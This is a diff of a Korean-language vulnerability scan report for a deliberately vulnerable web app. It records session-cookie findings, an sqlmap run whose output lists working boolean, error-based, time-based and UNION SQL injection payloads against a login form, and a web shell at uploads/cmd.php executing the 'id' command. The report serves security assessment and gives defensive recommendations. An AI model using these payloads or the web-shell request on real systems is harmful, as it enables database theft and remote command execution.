@@ -1,13 +1,13 @@
 {
-  "scan_id": "SCAN-20260517-234455",
+  "scan_id": "SCAN-20260518-095942",
   "target": "http://15.164.60.79",
   "scanner": "signature-based",
-  "generated_at": "2026-05-17T23:44:55+09:00",
+  "generated_at": "2026-05-18T09:59:42+09:00",
   "summary": {
     "total": 21,
     "severity": {
-      "critical": 0,
-      "high": 4,
+      "critical": 1,
+      "high": 3,
       "medium": 8,
       "low": 2,
       "pass": 4,
@@ -103,7 +103,7 @@
       "name": "쿠키 Secure/HttpOnly 미설정",
       "url": "/vulnapp/login.jsp",
       "severity": "medium",
-      "evidence": "Set-Cookie=JSESSIONID=A5D8B62B0ECD1D232677824C8436B95A; Path=/vulnapp; HttpOnly, missing=['secure', 'samesite']",
+      "evidence": "Set-Cookie=JSESSIONID=A31C26BD75EDA74C4A2FAC1A3F801884; Path=/vulnapp; HttpOnly, missing=['secure', 'samesite']",
       "recommendation": "세션 쿠키에 Secure, HttpOnly, SameSite 속성을 적용해야 한다."
     },
     {
@@ -121,7 +121,7 @@
         "sqlmap": {
           "command": "sqlmap -u http://15.164.60.79/vulnapp/login.jsp --batch --level 2 --risk 1 --banner --current-user --current-db --is-dba --dbs --data id=test&pw=test",
           "returncode": 0,
-          "raw_tail": "IONID=BDAFE72B99A...066DCAB1FF'). Do you want to use those [Y/n] Y\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: id (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: id=test' AND 1942=(SELECT (CASE WHEN (1942=1942) THEN 1942 ELSE (SELECT 3481 UNION SELECT 6931) END))-- -&pw=test\n\n    Type: error-based\n    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)\n    Payload: id=test' AND EXTRACTVALUE(1276,CONCAT(0x5c,0x717a787671,(SELECT (ELT(1276=1276,1))),0x71786a7871)) AND 'eTUC'='eTUC&pw=test\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: id=test' AND (SELECT 4127 FROM (SELECT(SLEEP(5)))gDqM) AND 'OXDt'='OXDt&pw=test\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 4 columns\n    Payload: id=test' UNION ALL SELECT NULL,CONCAT(0x717a787671,0x4142514164594f4d79596151685377774e527562454b585269536c4c694e726f584d704c6f62524a,0x71786a7871),NULL,NULL-- -&pw=test\n---\n[23:44:53] [INFO] the back-end DBMS is MySQL\n[23:44:53] [INFO] fetching banner\nweb server operating system: Linux Ubuntu\nweb application technology: Django, JSP, Nginx 1.28.3\nback-end DBMS operating system: Linux Ubuntu\nback-end DBMS: MySQL >= 5.1 (MariaDB fork)\nbanner: '11.8.6-MariaDB-5 from Ubuntu'\n[23:44:53] [INFO] fetching current user\ncurrent user: 'vulnuser@localhost'\n[23:44:53] [INFO] fetching current database\ncurrent database: 'vuln_db'\n[23:44:53] [INFO] testing if current user is DBA\n[23:44:53] [INFO] fetching current user\n[23:44:53] [WARNING] potential permission problems detected ('command denied')\ncurrent user is DBA: False\n[23:44:53] [INFO] fetching database names\navailable databases [2]:\n[*] information_schema\n[*] vuln_db\n\n[23:44:53] [INFO] fetched data logged to text files under 'C:\\Users\\EZ\\AppData\\Local\\sqlmap\\output\\15.164.60.79'\n\n[*] ending @ 23:44:53 /2026-05-17/\n\n\n"
+          "raw_tail": "IONID=56565A5FDF3...EA9CF3B4C6'). Do you want to use those [Y/n] Y\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: id (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: id=test' AND 1942=(SELECT (CASE WHEN (1942=1942) THEN 1942 ELSE (SELECT 3481 UNION SELECT 6931) END))-- -&pw=test\n\n    Type: error-based\n    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)\n    Payload: id=test' AND EXTRACTVALUE(1276,CONCAT(0x5c,0x717a787671,(SELECT (ELT(1276=1276,1))),0x71786a7871)) AND 'eTUC'='eTUC&pw=test\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: id=test' AND (SELECT 4127 FROM (SELECT(SLEEP(5)))gDqM) AND 'OXDt'='OXDt&pw=test\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 4 columns\n    Payload: id=test' UNION ALL SELECT NULL,CONCAT(0x717a787671,0x4142514164594f4d79596151685377774e527562454b585269536c4c694e726f584d704c6f62524a,0x71786a7871),NULL,NULL-- -&pw=test\n---\n[09:59:41] [INFO] the back-end DBMS is MySQL\n[09:59:41] [INFO] fetching banner\nweb server operating system: Linux Ubuntu\nweb application technology: JSP, Nginx 1.28.3, Django\nback-end DBMS operating system: Linux Ubuntu\nback-end DBMS: MySQL >= 5.1 (MariaDB fork)\nbanner: '11.8.6-MariaDB-5 from Ubuntu'\n[09:59:41] [INFO] fetching current user\ncurrent user: 'vulnuser@localhost'\n[09:59:41] [INFO] fetching current database\ncurrent database: 'vuln_db'\n[09:59:41] [INFO] testing if current user is DBA\n[09:59:41] [INFO] fetching current user\n[09:59:41] [WARNING] potential permission problems detected ('command denied')\ncurrent user is DBA: False\n[09:59:41] [INFO] fetching database names\navailable databases [2]:\n[*] information_schema\n[*] vuln_db\n\n[09:59:41] [INFO] fetched data logged to text files under 'C:\\Users\\EZ\\AppData\\Local\\sqlmap\\output\\15.164.60.79'\n\n[*] ending @ 09:59:41 /2026-05-18/\n\n\n"
         }
       },
       "recommendation": "PreparedStatement와 바인딩 파라미터를 사용하고 입력값 검증 및 DB 오류 메시지 비노출 처리를 적용해야 한다."
@@ -212,9 +212,9 @@
       "owasp": "A08:2025 Software or Data Integrity Failures",
       "name": "웹쉘 업로드 가능",
       "url": "/vulnapp/upload.jsp",
-      "severity": "high",
-      "evidence": "게시글 목록/상세 또는 업로드 응답에서 확인된 첨부파일 링크 http://15.164.60.79/vulnapp/fileDownload.jsp?filename=shell.jsp 접근 시 JSP_UPLOAD_TEST 문자열이 출력됨. 실행 가능한 JSP 파일이 서버 디렉터리에 저장되고 외부에서 접근 가능한 URL을 통해 실행되는 것으로 확인됨. 업로드 시도: ['http://15.164.60.79/vulnapp/upload_process.jsp status=200 final_url=http://15.164.60.79/vulnapp/upload_process.jsp', 'http://15.164.60.79/vulnapp/upload.jsp status=200 final_url=http://15.164.60.79/vulnapp/upload.jsp']",
-      "recommendation": "파일 업로드 시 .jsp, .jspx, .php 등 실행 가능한 확장자를 차단하고, 업로드 파일은 웹 루트 외부에 저장하며 파일 접근은 다운로드 전용 핸들러로 처리해야 한다."
+      "severity": "critical",
+      "evidence": "업로드된 웹쉘 경로 http://15.164.60.79/vulnapp/uploads/cmd.php?cmd=id 접근 시 OS 명령 실행 결과가 응답에 포함됨. 응답 샘플: <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)\n</pre>. 웹서버 권한으로 원격 명령 실행이 가능하여 critical 수준의 웹쉘 업로드 취약점으로 판단함.",
+      "recommendation": "파일 업로드 시 .php, .jsp, .jspx 등 실행 가능한 확장자를 차단하고, 업로드 파일은 웹 루트 외부의 비실행 디렉터리에 저장해야 한다. 웹서버에서 업로드 디렉터리의 스크립트 실행을 비활성화하고, 파일명 난수화, MIME 타입 및 파일 시그니처 검증, 다운로드 전용 핸들러를 적용해야 한다."
     },
     {
       "id": "RES-0020",
